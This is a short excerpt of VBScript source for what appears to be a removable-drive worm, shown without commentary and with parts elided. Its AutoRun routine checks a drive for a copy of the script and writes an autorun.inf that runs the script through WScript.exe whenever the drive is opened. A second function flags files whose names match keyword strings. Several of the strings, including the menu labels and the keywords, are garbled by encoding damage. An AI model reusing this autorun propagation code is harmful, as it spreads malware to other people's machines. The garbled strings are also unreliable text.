...
Sub AutoRun(objfso, D,vbsCode)
    ...
    If objfso.FileExists(path_vbs) = False Or objfso.FileExists(path_autorun) = False or GetVersion(objfso,path_vbs)<Version Then 
        ...
        inf_autorun = "[AutoRun]" & vbCrLf & "Shellexecute=WScript.exe " & Name_V1 & " ""AutoRun""" & vbCrLf & "shell\AutoRun=Sb_(O)" & vbCrLf &  "shell\AutoRun\command=WScript.exe " & Name_V1 & " ""AutoRun""" & vbCrLf & "shell\AutoRun1=Dn¡{thV(X)" & vbCrLf &  "shell\AutoRun1\command=WScript.exe " & Name_V1 & " ""AutoRun"""
...
Function IsSexFile(fname)
    IsSexFile = False
    If InStr(fname, "bºN")>0 Or InStr(fname, "ëm")>0 Or InStr(fname, "wPÍb")>0 Or _
                InStr(fname, "wP¥z")>0 Or InStr(fname, "ãS¤N")>0 Or InStr(fname, ":_xY")>0 Or _
                InStr(fname, "nxY")>0 Or InStr(fname, "&OtGr")>0 Or InStr(fname, "êxd")>0 Then
        IsSexFile = True
    End If
End Function
